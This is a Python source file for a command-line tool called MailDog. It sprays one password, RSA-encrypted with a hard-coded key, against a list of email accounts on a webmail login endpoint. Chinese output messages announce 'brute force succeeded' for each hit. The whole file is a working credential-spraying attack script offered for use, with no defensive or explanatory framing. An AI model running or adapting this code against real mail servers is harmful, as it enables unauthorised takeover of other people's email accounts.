# _*_coding:utf-8 _*_
import requests, urllib3, warnings
import base64, re, time
import rsa
import fire


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore')
try:
    requests.packages.urllib3.disable_warnings()
    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += 'HIGH:!DH:!aNULL'
except Exception as e:
    print(e)

class MailDog(object):

    def __init__(self,domain,mailadd,passwd):
        self.domain = domain
        self.mailadd = mailadd
        self.passwd = passwd

    def gen_mail_list(self):
        with open("./{}".format(self.mailadd), "r", encoding='utf-8') as f:
            mailist = [x.strip() for x in f.readlines()]
        return mailist

    def judge_alive(self):
        mail_url = "https://{}".format(self.domain)
        headers = {
            "Sec-Ch-Ua-Mobile": "?0", 
            "Upgrade-Insecure-Requests": "1", 
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/6.1.6 Safari/537.78.2", 
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
            "Sec-Fetch-Site": "none", 
            "Sec-Fetch-Mode": "navigate", 
            "Sec-Fetch-User": "?1", 
            "Sec-Fetch-Dest": "document", 
            "Accept-Encoding": "gzip, deflate", 
            "Accept-Language": "zh-CN,zh;q=0.9", 
            "Connection": "close"
        }
        resp = requests.get(mail_url, headers=headers, timeout=2)
        if resp.status_code and resp.status_code == 200:
            return True
        else:
            return False

    def encrypt_with_modulus(self):
        """
        根据 模量与指数 生成公钥，并利用公钥对内容 rsa 加密返回结果
        """
        m = "CF87D7B4C864F4842F1D337491A48FFF54B73A17300E8E42FA365420393AC0346AE55D8AFAD975DFA175FAF0106CBA81AF1DDE4ACEC284DAC6ED9A0D8FEB1CC070733C58213EFFED46529C54CEA06D774E3CC7E073346AEBD6C66FC973F299EB74738E400B22B1E7CDC54E71AED059D228DFEB5B29C530FF341502AE56DDCFE9"
        e = "10001"
        print(e)
        e = int(e, 16)
        m = int(m, 16)
        # print(e,m)

        content = '{}\n{}\n'.format(self.passwd,int(time.time()))
        pub_key = rsa.PublicKey(e=e, n=m)
        m = rsa.encrypt(content.encode(),pub_key)
        b64pass = base64.b64encode(bytes.fromhex(m.hex())).decode("utf-8")
        return b64pass

    def force_pass(self,mailadd,encodepass):
        url = "https://{}/cgi-bin/login".format(self.domain)
        headers = {
            "Sec-Ch-Ua-Mobile": "?0", 
            "Upgrade-Insecure-Requests": "1", 
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/6.1.6 Safari/537.78.2", 
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
            "Sec-Fetch-Site": "none", 
            "Sec-Fetch-Mode": "navigate", 
            "Sec-Fetch-User": "?1", 
            "Sec-Fetch-Dest": "document",
            "Referer": "https://{}/".format(self.domain), 
            "Accept-Encoding": "gzip, deflate", 
            "Accept-Language": "zh-CN,zh;q=0.9", 
            "Connection": "close"
        }
        post_data = {
            "device_type": "web", 
            "device_name": "chrome", 
            "sid": '', 
            "uin": "{}".format(mailadd), 
            "domain": "{}".format(self.domain), 
            "aliastype": "other", 
            "errtemplate": "logindomain", 
            "firstlogin": "false", 
            "f": "html", 
            "p": "{}".format(encodepass), 
            "delegate_url": '', 
            "ppp": '', 
            "ts": "{}".format(int(time.time())), 
            "chg": "0", 
            "fun": '', 
            "vt": '', 
            "inputuin": '', 
            "wx_login_code": '', 
            "t": '', 
            "ef": '', 
            "login_from": "mail_login_{}".format(self.domain), 
            "qquin": "lium", 
            "pp": "0000000", 
            "verifycode": '', 
            "area": "86", 
            "mobile": '', 
            "sms_token": "\r\n"
        }

        try:
            resp = requests.post(url, headers=headers, data=post_data)
            print(mailadd + "     Thread OK   "+str(resp.status_code))
        

            if resp.text and "frame_html?sid=" in resp.text:
                return True
            else:
                return False
        except:
            pass

    def run(self):

        mailist = self.gen_mail_list()
        b64pass = self.encrypt_with_modulus()
        if self.judge_alive():
            for i in mailist:
                try:
                    result = self.force_pass(i,b64pass)
                    if result:
                        print(i + "    爆破成功！！！！！！！！！！！！！！！！！！！！！！！")
                    else:
                        pass
                except:
                    pass
                time.sleep(1)
        else:
            print("目标邮箱服务器不存活，请检查邮箱服务器。")


if __name__ == '__main__':
    logo = """
 __  __ _ _      ____   ___   ____ ____   ___   ____ 
|  \/  (_) | ___|  _ \ / _ \ / ___|  _ \ / _ \ / ___|
| |\/| | | |/ _ \ | | | | | | |  _| | | | | | | |  _ 
| |  | | | |  __/ |_| | |_| | |_| | |_| | |_| | |_| |
|_|  |_|_|_|\___|____/ \___/ \____|____/ \___/ \____|
                                        by tu
    """
    print(logo)
    fire.Fire(MailDog)

